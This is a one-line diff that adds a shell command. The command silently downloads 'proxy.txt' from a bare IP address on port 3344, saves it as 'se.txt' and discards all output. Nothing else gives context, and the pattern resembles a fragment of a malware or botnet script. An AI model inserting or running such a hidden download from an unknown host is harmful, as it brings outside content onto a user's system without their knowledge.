@@ -1,0 +1,1 @@
+wget http://60.214.107.102:3344/proxy.txt -O se.txt >/dev/null 2>&1
